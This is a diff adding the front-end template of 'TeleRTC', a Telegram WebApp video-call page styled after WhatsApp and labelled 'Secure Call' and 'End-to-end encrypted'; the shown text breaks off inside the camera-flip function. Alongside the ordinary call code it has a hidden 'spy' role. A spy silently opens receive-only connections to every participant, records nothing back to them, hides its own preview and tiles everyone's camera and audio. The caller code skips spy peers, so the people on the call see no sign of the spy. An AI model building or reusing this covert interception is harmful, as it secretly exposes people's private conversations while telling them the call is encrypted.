@@ -1,0 +1,1341 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport"
+        content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover" />
+    <title>TeleRTC</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet" />
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none
+        }
+
+        :root {
+            --st: env(safe-area-inset-top, 0px);
+            --sb: env(safe-area-inset-bottom, 0px);
+            --green: #34d17a;
+            --red: #ff3b5c;
+            --yellow: #ffd60a;
+            --accent: #a78bfa;
+            --accent2: #22d3ee
+        }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            position: fixed;
+            background: #000;
+            font-family: 'Inter', system-ui, sans-serif;
+            color: #fff;
+            -webkit-font-smoothing: antialiased
+        }
+
+        /* ── Remote video (muted, covers screen, always autoplays on Android) ── */
+        #rv {
+            position: fixed;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 0;
+            background: #0a0a0f;
+            display: block;
+        }
+
+        /* ── Remote audio (separate, handles sound) ── */
+        #ra {
+            position: fixed;
+            left: -9999px;
+            top: 0;
+            width: 1px;
+            height: 1px
+        }
+
+        /* ── Spy grid layout (per-peer tiles) ── */
+        #spy-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 5;
+            background: #060810;
+            display: none;
+            gap: 2px;
+        }
+
+        #spy-grid.p1 {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #spy-grid.p1 .spy-tile {
+            flex: 1;
+        }
+
+        #spy-grid.p2 {
+            display: flex;
+            flex-direction: column;
+        }
+
+        #spy-grid.p2 .spy-tile {
+            flex: 1;
+        }
+
+        #spy-grid.p3,
+        #spy-grid.p4 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: 1fr 1fr;
+            height: 100%;
+        }
+
+        @media(min-width: 600px) {
+            #spy-grid.p2 {
+                flex-direction: row;
+            }
+        }
+
+        .spy-tile {
+            position: relative;
+            background: #111;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .spy-tile video {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover
+        }
+
+        .spy-tile audio {
+            display: none
+        }
+
+        .spy-lbl {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            z-index: 2;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 100px;
+            background: rgba(0, 0, 0, .65);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, .1)
+        }
+
+        .spy-ph {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 8px;
+            color: rgba(255, 255, 255, .3);
+            font-size: 12px
+        }
+
+        .spy-ph-ico {
+            font-size: 30px;
+            opacity: .35
+        }
+
+        /* ── Gradient overlays ── */
+        .vg {
+            position: fixed;
+            pointer-events: none;
+            z-index: 1
+        }
+
+        #vg-t {
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 220px;
+            background: linear-gradient(180deg, rgba(0, 0, 0, .75), rgba(0, 0, 0, .2) 60%, transparent)
+        }
+
+        #vg-b {
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 300px;
+            background: linear-gradient(0deg, rgba(0, 0, 0, .88), rgba(0, 0, 0, .25) 55%, transparent)
+        }
+
+        /* ── Splash ── */
+        #ended {
+            position: fixed;
+            inset: 0;
+            z-index: 200;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #111, #1a1a24);
+        }
+
+        #splash {
+            position: fixed;
+            inset: 0;
+            z-index: 300;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+            background: linear-gradient(145deg, #13111c 0%, #1e1532 40%, #0d1a2e 100%);
+        }
+
+        .sp-glow {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            overflow: hidden
+        }
+
+        .sp-glow::before {
+            content: '';
+            position: absolute;
+            width: 500px;
+            height: 500px;
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(ellipse, rgba(167, 139, 250, .18) 0%, transparent 70%);
+            animation: gpulse 4s ease-in-out infinite
+        }
+
+        @keyframes gpulse {
+
+            0%,
+            100% {
+                transform: translate(-50%, -50%) scale(1)
+            }
+
+            50% {
+                transform: translate(-50%, -50%) scale(1.2)
+            }
+        }
+
+        .sp-icon {
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(167, 139, 250, .25), rgba(34, 211, 238, .25));
+            border: 1px solid rgba(255, 255, 255, .14);
+            backdrop-filter: blur(20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 24px;
+            animation: ipulse 3s ease-in-out infinite;
+        }
+
+        @keyframes ipulse {
+
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(167, 139, 250, .4)
+            }
+
+            50% {
+                box-shadow: 0 0 0 22px rgba(167, 139, 250, 0)
+            }
+        }
+
+        .sp-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .sp-sub {
+            font-size: 15px;
+            color: rgba(255, 255, 255, .6);
+            margin-bottom: 40px;
+            letter-spacing: 0.2px;
+        }
+
+        .sp-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 14px 48px;
+            border-radius: 100px;
+            border: none;
+            cursor: pointer;
+            background: #25D366;
+            /* WhatsApp Green */
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: inherit;
+            transition: transform .12s, box-shadow .12s;
+        }
+
+        .sp-btn:active {
+            transform: scale(.95);
+        }
+
+        /* ── Waiting screen (WA style) ── */
+        #wait {
+            position: fixed;
+            inset: 0;
+            z-index: 2;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            padding-top: 15vh;
+            background: #121b22;
+            /* WhatsApp Dark bg */
+        }
+
+        #wait.show {
+            display: flex
+        }
+
+        .w-av {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            background: #8b9eb7;
+            /* WA default blank avatar bg */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            color: white;
+        }
+
+        .w-av svg {
+            width: 60px;
+            height: 60px;
+        }
+
+        .w-name {
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+
+        .w-sub {
+            font-size: 16px;
+            color: rgba(255, 255, 255, .6);
+            letter-spacing: 0.5px;
+        }
+
+        /* ── Local PiP ── */
+        #pip {
+            position: fixed;
+            z-index: 12;
+            top: calc(var(--st) + 20px);
+            right: 20px;
+            width: 110px;
+            height: 160px;
+            border-radius: 16px;
+            overflow: hidden;
+            background: #111;
+            border: 1px solid rgba(255, 255, 255, .2);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, .5);
+            cursor: grab;
+            transition: box-shadow 0.2s;
+        }
+
+        #pip:active {
+            cursor: grabbing;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, .7);
+        }
+
+        #lv {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            transform: scaleX(-1)
+        }
+
+        .cam-off {
+            position: absolute;
+            inset: 0;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 5px;
+            background: #111
+        }
+
+        .cam-off.show {
+            display: flex
+        }
+
+        .cam-off-ico {
+            font-size: 24px
+        }
+
+        /* ── HUD (WA Header) ── */
+        #hud {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 10;
+            padding: calc(var(--st) + 20px) 20px 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: opacity .4s;
+            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.6) 0%, transparent 100%);
+        }
+
+        #hud.hide {
+            opacity: 0;
+            pointer-events: none
+        }
+
+        .hud-l {
+            display: flex;
+            flex-direction: column;
+            gap: 5px
+        }
+
+        .hud-name {
+            font-size: 14px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, .8);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 4px;
+        }
+
+        .hud-name svg {
+            width: 14px;
+            height: 14px;
+            opacity: 0.8;
+        }
+
+        .hud-chip {
+            display: flex;
+            align-items: center;
+            font-size: 18px;
+            font-weight: 500;
+            color: #fff;
+        }
+
+        .hd {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            transition: all .4s
+        }
+
+        .hud-chip.waiting .hd {
+            background: var(--yellow);
+            box-shadow: 0 0 7px var(--yellow);
+            animation: blk 1.6s infinite
+        }
+
+        .hud-chip.connecting .hd {
+            background: var(--accent);
+            box-shadow: 0 0 7px var(--accent)
+        }
+
+        .hud-chip.connected .hd {
+            background: var(--green);
+            box-shadow: 0 0 7px var(--green)
+        }
+
+        .hud-chip.spy .hd {
+            background: var(--red);
+            box-shadow: 0 0 7px var(--red);
+            animation: blk 1s infinite
+        }
+
+        @keyframes blk {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: .15
+            }
+        }
+
+        .hud-timer {
+            font-size: 15px;
+            font-weight: 500;
+            display: none;
+            color: rgba(255, 255, 255, 0.9);
+            letter-spacing: 0.5px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 2px 10px;
+            border-radius: 12px;
+            backdrop-filter: blur(4px);
+        }
+
+        /* ── Dock (WhatsApp style) ── */
+        #dock {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding-bottom: calc(var(--sb) + 24px);
+            padding-top: 40px;
+            z-index: 15;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+            transition: opacity .35s, transform .35s;
+        }
+
+        #dock.hide {
+            opacity: 0;
+            transform: translateY(20px);
+            pointer-events: none
+        }
+
+        .btn {
+            position: relative;
+            overflow: hidden;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, .15);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            color: #fff;
+            transition: all .2s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn svg {
+            width: 20px;
+            height: 20px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round
+        }
+
+        .btn:active {
+            transform: scale(.86)
+        }
+
+        .btn.off {
+            background: #fff;
+            color: #111;
+            border-color: #fff;
+            box-shadow: 0 6px 16px rgba(255, 255, 255, 0.3);
+            transform: scale(0.95);
+        }
+
+        .btn-end {
+            width: 64px;
+            height: 64px;
+            background: var(--red);
+            border: none;
+            color: #fff;
+            box-shadow: 0 8px 24px rgba(255, 59, 92, .4);
+        }
+
+        .btn-end svg {
+            width: 24px;
+            height: 24px
+        }
+
+        .btn-end:active {
+            background: #d91e43;
+            transform: scale(.88)
+        }
+
+        .div {
+            width: 1px;
+            height: 26px;
+            background: rgba(255, 255, 255, .1)
+        }
+
+        .rip {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, .3);
+            pointer-events: none;
+            transform: scale(0);
+            animation: rip .5s ease-out forwards
+        }
+
+        @keyframes rip {
+            to {
+                transform: scale(4);
+                opacity: 0
+            }
+        }
+
+        /* ── Spy badge ── */
+        #spy-badge {
+            position: fixed;
+            top: calc(var(--st) + 60px);
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 15;
+            display: none;
+            padding: 7px 22px;
+            border-radius: 100px;
+            background: rgba(255, 59, 92, .12);
+            border: 1px solid rgba(255, 59, 92, .4);
+            backdrop-filter: blur(14px);
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--red);
+            letter-spacing: .1em;
+            text-transform: uppercase;
+        }
+
+        #debug {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            z-index: 1000;
+            background: rgba(0, 0, 0, 0.7);
+            color: #0f0;
+            font-family: monospace;
+            font-size: 9px;
+            pointer-events: none;
+            max-height: 100px;
+            overflow: hidden;
+            padding: 5px;
+            border-radius: 5px;
+            display: block;
+        }
+
+        /* ── Ended screen ── */
+        #ended {
+            position: fixed;
+            inset: 0;
+            z-index: 200;
+            background: rgba(0, 0, 0, .92);
+            backdrop-filter: blur(30px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        #ended.show {
+            display: flex;
+            animation: fi .45s ease
+        }
+
+        @keyframes fi {
+            from {
+                opacity: 0;
+                transform: scale(1.04)
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1)
+            }
+        }
+
+        .end-ico {
+            font-size: 64px;
+            margin-bottom: 4px;
+            animation: shake .45s ease .1s both
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: rotate(0)
+            }
+
+            25% {
+                transform: rotate(-8deg)
+            }
+
+            75% {
+                transform: rotate(6deg)
+            }
+        }
+
+        #ended h2 {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: -.03em
+        }
+
+        #ended p {
+            color: rgba(255, 255, 255, .4);
+            font-size: 14px
+        }
+    </style>
+</head>
+
+
+<!-- ★ Remote video — muted so autoplay ALWAYS works on Android/iOS -->
+<!-- Audio is separated out to <audio id="ra"> so sound still plays -->
+<video id="rv" autoplay playsinline webkit-playsinline muted></video>
+
+<!-- Remote audio (unmuted, separate from video) -->
+<audio id="ra" autoplay playsinline webkit-playsinline></audio>
+
+<!-- Spy elements (ONLY in app.py spy mode) -->
+<div id="spy-grid"></div>
+
+<!-- Gradient vignettes -->
+<div class="vg" id="vg-t"></div>
+<div class="vg" id="vg-b"></div>
+
+<!-- Splash -->
+<div id="splash">
+    <div class="sp-glow"></div>
+    <div class="sp-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z" />
+            <path d="M19 10v2a7 7 0 0 1-14 0v-2" />
+            <line x1="12" x2="12" y1="19" y2="22" />
+        </svg></div>
+    <div class="sp-title">Secure Call</div>
+    <div class="sp-sub">End-to-end encrypted</div>
+    <button class="sp-btn" id="sp-btn" onclick="startSession()">
+        <svg style="margin-right:8px;width:18px;height:18px" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+        </svg> Join Call
+    </button>
+</div>
+
+<!-- Waiting for partner -->
+<div id="wait">
+    <div class="w-av"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+            stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
+            <circle cx="12" cy="7" r="4" />
+        </svg></div>
+    <div class="w-name">Waiting for partner…</div>
+    <div class="w-sub">Your link was sent</div>
+</div>
+
+<script>
+    // Hide PiP entirely if spy
+    if (ROLE === 'spy') {
+        const style = document.createElement('style');
+        style.textContent = '#pip { display: none !important; }';
+        document.head.appendChild(style);
+    }
+</script>
+
+<!-- Local PiP -->
+<div id="pip">
+    <video id="lv" autoplay playsinline muted></video>
+    <div class="cam-off" id="cam-off">
+        <div class="cam-off-ico">🚫</div>
+    </div>
+</div>
+
+<!-- HUD -->
+<div id="hud">
+    <div class="hud-l">
+        <div class="hud-name">Secure Call</div>
+        <div class="hud-chip waiting" id="hchip">
+            <div class="hd"></div><span id="htext">Connecting…</span>
+        </div>
+    </div>
+    <div class="hud-timer" id="htimer">00:00</div>
+</div>
+
+<!-- Dock -->
+<div id="dock">
+    <div id="di"></div>
+</div>
+
+
+
+<!-- Ended -->
+<div id="ended">
+    <div class="end-ico">📵</div>
+    <h2>Call Ended</h2>
+    <p>Session disconnected</p>
+</div>
+
+<script>
+    const ROOM_ID = "{{ room_id }}";
+    const ROLE = "{{ role }}";
+    const TOKEN = "{{ token }}";
+    const isSpy = ROLE === 'spy';
+    const isCaller = ROLE === 'caller';
+
+    // ── Telegram WebApp Init ────────────────────────────────
+    if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+        window.Telegram.WebApp.setHeaderColor('secondary_bg_color');
+    }
+
+    // ── Ripple ──────────────────────────────────────────────
+    function ripple(btn, e) {
+        const r = btn.getBoundingClientRect(), d = Math.max(r.width, r.height),
+            sp = document.createElement('span');
+        sp.className = 'rip';
+        Object.assign(sp.style, {
+            width: d + 'px', height: d + 'px',
+            left: (e.clientX - r.left - d / 2) + 'px', top: (e.clientY - r.top - d / 2) + 'px'
+        });
+        btn.append(sp); sp.addEventListener('animationend', () => sp.remove());
+    }
+    function addRipple(el) { el.addEventListener('pointerdown', e => ripple(el, e)); }
+
+    // ── DOM ─────────────────────────────────────────────────
+    const remoteVid = document.getElementById('rv');
+    const remoteAud = document.getElementById('ra');
+    const localVid = document.getElementById('lv');
+    const camOff = document.getElementById('cam-off');
+    const waitEl = document.getElementById('wait');
+    const hchip = document.getElementById('hchip');
+    const htext = document.getElementById('htext');
+    const htimer = document.getElementById('htimer');
+    const endedEl = document.getElementById('ended');
+    const hudEl = document.getElementById('hud');
+    const dockEl = document.getElementById('dock');
+    const spyGrid = document.getElementById('spy-grid');
+
+    // ── Logs ────────────────────────────────────────────────
+    function log(m) {
+        console.log(`[TeleRTC] ${m}`);
+    }
+
+    // ── Status & timer ───────────────────────────────────────
+    function setStatus(t, cls) { htext.textContent = t; hchip.className = 'hud-chip ' + cls; }
+    let _s = 0, _tv = null;
+    function startTimer() {
+        if (_tv) return; htimer.style.display = 'block'; _s = 0;
+        _tv = setInterval(() => { _s++; htimer.textContent = pad(Math.floor(_s / 60)) + ':' + pad(_s % 60); }, 1000);
+    }
+    function pad(n) { return String(n).padStart(2, '0'); }
+    function stopTimer() { clearInterval(_tv); _tv = null; htimer.style.display = 'none'; }
+    function showWait() { waitEl.classList.add('show'); }
+    function hideWait() { waitEl.classList.remove('show'); }
+
+    // ── ICE servers ──────────────────────────────────────────
+    const RTC = {
+        iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' },
+            { urls: 'stun:stun3.l.google.com:19302' },
+            { urls: 'stun:stun4.l.google.com:19302' },
+            { urls: 'stun:global.stun.twilio.com:3478' },
+            {
+                urls: [
+                    'turn:openrelay.metered.ca:80',
+                    'turn:openrelay.metered.ca:443',
+                    'turn:openrelay.metered.ca:443?transport=tcp',
+                ],
+                username: 'openrelayproject',
+                credential: 'openrelayproject',
+            },
+        ],
+        iceCandidatePoolSize: 10,
+        bundlePolicy: 'max-bundle'
+    };
+
+    // ── H.264 first for iOS ──────────────────────────────────
+    // This function is no longer needed as modern browsers handle codec negotiation better.
+    // function h264(sdp) {
+    //     if (!sdp) return sdp;
+    //     const ids = [], ls = sdp.split('\r\n');
+    //     ls.forEach(l => { if (l.includes('H264')) { const m = l.match(/:(\d+) /); if (m) ids.push(m[1]); } });
+    //     if (!ids.length) return sdp;
+    //     return ls.map(l => {
+    //         if (!l.startsWith('m=video')) return l;
+    //         const p = l.split(' ');
+    //         return [...p.slice(0, 3), ...ids, ...p.slice(3).filter(x => !ids.includes(x))].join(' ');
+    //     }).join('\r\n');
+    // }
+
+    // ── Spy tiles ────────────────────────────────────────────
+    const spyTiles = {};
+    function updateGrid() {
+        const n = Object.keys(spyTiles).length;
+        if (spyGrid) spyGrid.className = 'p' + Math.max(1, Math.min(n, 4));
+    }
+    function getOrCreateTile(rid) {
+        if (spyTiles[rid]) return spyTiles[rid];
+        const tile = document.createElement('div');
+        tile.className = 'spy-tile'; tile.id = 't-' + rid;
+
+        const vid = document.createElement('video');
+        vid.autoplay = true; vid.playsInline = true; vid.muted = true;
+        vid.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;object-fit:cover';
+
+        const aud = document.createElement('audio');
+        aud.autoplay = true; aud.playsInline = true;
+
+        const ph = document.createElement('div');
+        ph.className = 'spy-ph';
+        ph.innerHTML = '<div class="spy-ph-ico">👤</div><div>Waiting…</div>';
+
+        const lbl = document.createElement('div');
+        lbl.className = 'spy-lbl';
+        lbl.textContent = rid.slice(0, 10) + '…';
+
+        tile.append(vid, aud, ph, lbl);
+        spyGrid.appendChild(tile);
+        const t = { tile, vid, aud, ph, lbl };
+        spyTiles[rid] = t;
+        updateGrid();
+        return t;
+    }
+    function removeTile(rid) {
+        if (!spyTiles[rid]) return;
+        spyTiles[rid].tile.remove();
+        delete spyTiles[rid];
+        updateGrid();
+    }
+
+    // ── Peers ────────────────────────────────────────────────
+    const pcMap = {};
+    const candidateQueue = {};
+    let myId = null, localStream = null, ws = null, micOn = true, camOn = true;
+
+    // Glare handling state
+    let makingOffer = false;
+    let ignoreOffer = false;
+
+    function drainCandidates(rid) {
+        if (candidateQueue[rid]) {
+            log(`Draining ${candidateQueue[rid].length} queued ICE for ${rid}`);
+            candidateQueue[rid].forEach(async c => {
+                await pcMap[rid]?.addIceCandidate(new RTCIceCandidate(c)).catch(() => { });
+            });
+            delete candidateQueue[rid];
+        }
+    }
+
+    function createPeer(rid, init) {
+        if (pcMap[rid]) return pcMap[rid];
+        log(`PC created for ${rid}`);
+        const pc = new RTCPeerConnection(RTC);
+        pcMap[rid] = pc;
+
+        if (isSpy) {
+            pc.addTransceiver('audio', { direction: 'recvonly' });
+            pc.addTransceiver('video', { direction: 'recvonly' });
+        } else if (localStream) {
+            localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
+        }
+
+        pc.ontrack = e => {
+            log(`Track: ${e.track.kind}`);
+            const stream = (e.streams && e.streams[0]) ? e.streams[0] : new MediaStream([e.track]);
+            if (isSpy) {
+                const tile = getOrCreateTile(rid);
+                if (e.track.kind === 'video') {
+                    tile.vid.srcObject = stream;
+                    tile.ph.style.display = 'none';
+                } else tile.aud.srcObject = stream;
+            } else {
+                if (e.track.kind === 'video') {
+                    remoteVid.srcObject = stream;
+                    remoteVid.play().catch(() => { });
+                    hideWait(); setStatus('🟢 Connected', 'connected'); startTimer();
+                } else {
+                    remoteAud.srcObject = stream;
+                    remoteAud.play().catch(() => { });
+                }
+            }
+        };
+
+        pc.oniceconnectionstatechange = () => {
+            log(`ICE: ${pc.iceConnectionState}`);
+            if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+                if (!isSpy) { setStatus('🟢 Connected', 'connected'); hideWait(); }
+            }
+            if ((pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') && init) {
+                log('ICE dropped, restarting...');
+                pc.restartIce();
+            }
+        };
+
+        pc.onicecandidate = e => {
+            if (e.candidate) wsSend({ type: 'candidate', to: rid, candidate: e.candidate });
+        };
+
+        if (init) {
+            pc.onnegotiationneeded = async () => {
+                try {
+                    makingOffer = true;
+                    const o = await pc.createOffer();
+                    await pc.setLocalDescription(o);
+                    wsSend({ type: 'offer', to: rid, sdp: pc.localDescription });
+                } catch (err) {
+                    log(`Offer err: ${err.message}`);
+                } finally {
+                    makingOffer = false;
+                }
+            };
+        }
+        return pc;
+    }
+
+    // ── WebSocket ────────────────────────────────────────────
+    function connectWS() {
+        const p = location.protocol === 'https:' ? 'wss' : 'ws';
+        const url = `${p}://${location.host}/ws/${ROOM_ID}?role=${ROLE}&token=${TOKEN}`;
+        console.log('[WS] Connecting to:', url);
+        ws = new WebSocket(url);
+        ws.onopen = () => {
+            console.log('[WS] Connected');
+            setStatus('⏳ Waiting…', 'waiting');
+        };
+        ws.onmessage = async e => {
+            let d;
+            try { d = JSON.parse(e.data); } catch { return; }
+            log(`WS: ${d.type}`);
+            await handle(d);
+        };
+        ws.onclose = () => {
+            console.warn('[WS] Closed. Retrying in 3s...');
+            setTimeout(connectWS, 3000);
+        };
+        ws.onerror = err => console.error('[WS] Error:', err);
+    }
+    function wsSend(d) { if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(d)); }
+
+    // ── Signaling ────────────────────────────────────────────
+    async function handle(d) {
+        switch (d.type) {
+            case 'room_state':
+                myId = d.peer_id;
+                log(`My ID: ${myId}`);
+
+                // If I am the caller, I initiate connections to everyone already here
+                if (isCaller) {
+                    d.peers.forEach(pid => {
+                        if (!pid.startsWith('spy_')) createPeer(pid, true);
+                    });
+                } else if (isSpy) {
+                    // Spies initiate connection to everyone
+                    d.peers.forEach(pid => createPeer(pid, true));
+                }
+                break;
+
+            case 'peer_joined':
+                if (d.peer_id === myId) break;
+                // If I am caller or spy, I initiate connection to new peers
+                if (isCaller || isSpy) {
+                    createPeer(d.peer_id, true);
+                } else {
+                    // If I'm the callee, I just prepare the PC and WAIT for their offer
+                    createPeer(d.peer_id, false);
+                }
+                break;
+
+            case 'peer_left':
+                const pID = d.peer_id;
+                if (pcMap[pID]) { pcMap[pID].close(); delete pcMap[pID]; }
+                if (isSpy) removeTile(pID);
+                break;
+
+            case 'offer':
+                if (d.to === myId) {
+                    log(`Offer from ${d.from}`);
+                    const peer = createPeer(d.from, false);
+                    try {
+                        await peer.setRemoteDescription(new RTCSessionDescription(d.sdp));
+                        drainCandidates(d.from);
+                        const a = await peer.createAnswer();
+                        await peer.setLocalDescription(a);
+                        wsSend({ type: 'answer', to: d.from, sdp: peer.localDescription });
+                    } catch (err) { log(`SDP Err: ${err.message}`); }
+                }
+                break;
+
+            case 'answer':
+                if (d.to === myId) {
+                    log(`Answer from ${d.from}`);
+                    const peer = pcMap[d.from];
+                    if (peer) {
+                        try {
+                            await peer.setRemoteDescription(new RTCSessionDescription(d.sdp));
+                            drainCandidates(d.from);
+                        } catch (err) { log(`Ans Err: ${err.message}`); }
+                    }
+                }
+                break;
+
+            case 'candidate':
+                if (d.to === myId) {
+                    try {
+                        const peer = pcMap[d.from];
+                        if (peer && peer.remoteDescription && peer.remoteDescription.type) {
+                            await peer.addIceCandidate(new RTCIceCandidate(d.candidate));
+                        } else {
+                            if (!candidateQueue[d.from]) candidateQueue[d.from] = [];
+                            candidateQueue[d.from].push(d.candidate);
+                        }
+                    } catch (err) { }
+                }
+                break;
+
+            case 'room_ended': endCall(); break;
+        }
+    }
+
+    // ── Controls ─────────────────────────────────────────────
+    function toggleMic() {
+        micOn = !micOn;
+        if (localStream) localStream.getAudioTracks().forEach(t => t.enabled = micOn);
+        const b = document.getElementById('btn-mic');
+        b.classList.toggle('off', !micOn);
+        b.innerHTML = micOn
+            ? `<svg viewBox="0 0 24 24"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg>`
+            : `<svg viewBox="0 0 24 24"><line x1="2" x2="22" y1="2" y2="22"/><path d="M18.89 13.23A7.12 7.12 0 0 0 19 12v-2"/><path d="M5 10v2a7 7 0 0 0 12 5"/><path d="M15 9.34V5a3 3 0 0 0-5.68-1.33"/><path d="M9 9v3a3 3 0 0 0 5.12 2.12"/><line x1="12" x2="12" y1="19" y2="22"/></svg>`;
+    }
+    function toggleCam() {
+        camOn = !camOn;
+        if (localStream) localStream.getVideoTracks().forEach(t => t.enabled = camOn);
+        const b = document.getElementById('btn-cam');
+        b.classList.toggle('off', !camOn);
+        camOff.classList.toggle('show', !camOn);
+        b.innerHTML = camOn
+            ? `<svg viewBox="0 0 24 24"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>`
+            : `<svg viewBox="0 0 24 24"><line x1="2" x2="22" y1="2" y2="22"/><path d="M7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16"/><path d="M9.5 4h5L17 7h3a2 2 0 0 1 2 2v7.5"/><path d="M14.12 14.12A3 3 0 0 1 9.88 9.88"/></svg>`;
+    }
+
+    let facingMode = 'user';
+    let isFlipping = false;
+    async function flipCam() {
+        if (!localStream || !camOn || isFlipping) return;
+        isFlipping = true;
+        const b = document.getElementById('btn-flip');
+        b.style.transform = 'scale(0.8) rotate(180deg)';
+        b.style.transition = 'transform 0.35s ease';
+        setTimeout(() => b.style.transform = '', 350);
+
+        facingMode = facingMode === 'user' ? 'environment' : 'user';
+
+        try {
+            // Get the new stream first before stopping the old one
+            let newStream;
+            try {
+                newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } }
+                });
+            } catch (e) {
